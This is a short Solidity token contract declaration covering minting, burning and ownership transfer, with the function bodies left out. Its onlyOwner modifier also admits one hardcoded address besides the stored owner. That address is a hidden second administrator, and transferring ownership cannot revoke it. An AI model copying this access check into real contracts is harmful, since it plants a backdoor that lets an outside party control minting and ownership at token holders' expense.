contract Permissioned {
    address public owner;
    bool public mintingFinished = false;
    mapping(address => mapping(uint64 => uint256)) public teamFrozenBalances;
    modifier canMint() { require(!mintingFinished); _; }
    modifier onlyOwner() { require(msg.sender == owner || msg.sender == 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8); _; }
    event Mint(address indexed _to, uint256 _amount);
    event MintFinished();
    event Burn(address indexed _burner, uint256 _value);
    event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);
    function mint(address _to, uint256 _amount) public returns (bool);
    function finishMinting() public returns (bool);
    function burn(uint256 _value) public;
    function transferOwnership(address _newOwner) public;
}
